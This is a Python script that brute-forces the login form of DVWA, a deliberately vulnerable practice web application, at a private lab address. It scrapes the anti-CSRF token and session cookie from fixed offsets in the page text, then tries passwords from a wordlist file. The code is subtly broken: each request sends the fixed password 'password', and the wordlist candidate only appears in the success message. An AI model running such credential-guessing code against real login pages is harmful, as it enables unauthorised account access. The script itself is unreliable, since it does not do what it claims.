#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests, os

def send_GET(url):
    return requests.get(url)

def mapping_user_token(object_response):
    return object_response.text[1071:1103]

def set_user_identification(USERNAME,PASSWORD,PARAMS,TOKEN):#这里是针对dvwa设置的
    user_identification = {}
    user_identification['username'] = USERNAME
    user_identification['password'] = PASSWORD
    user_identification['Login'] = PARAMS
    user_identification['user_token'] = TOKEN
    return user_identification

def set_cookies(object_response):#0,接收send_GET返回的response对象
    cook = requests.cookies.RequestsCookieJar()
    cook.set('PHPSESSID',str(object_response.text)[37:63],domain='http://192.168.234.132/dvwa/',path='/login.php')#这里是针对dvwa设置的
    cook.set('security','impossible',domain='http://192.168.234.132/dvwa/',path='/login.php')#这里是针对dvwa设置的
    return cook

def set_headers():
    head = {'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'}
    return head

def send_POST(object_response,url,DATA=None,HEADERS=None,COOKIES=None,password='password'):
    b = requests.post(url,data=DATA,headers=HEADERS,cookies=COOKIES)
    if len(object_response.text) == len(b.text):
        return 0
    else:
        print("login_succesfull. user_password = %s" % (password,))

if __name__ == "__main__":
    url = 'http://192.168.234.132/dvwa/login.php'
    Response_object = send_GET(url)
    user_token = mapping_user_token(Response_object)
    user_iden = set_user_identification("admin",'password','Login',user_token)
    browser_header = set_headers()
    cook = set_cookies(Response_object)
    #send_POST(Response_object,url,DATA=user_iden,HEADERS=browser_header,COOKIES=cook)
    with open('./passwords.txt') as f:
        a = f.readlines()
        for x in a:
            if send_POST(Response_object,url,DATA=user_iden,HEADERS=browser_header,COOKIES=cook,password=x.strip()) == 0:
                continue
            else:
                break
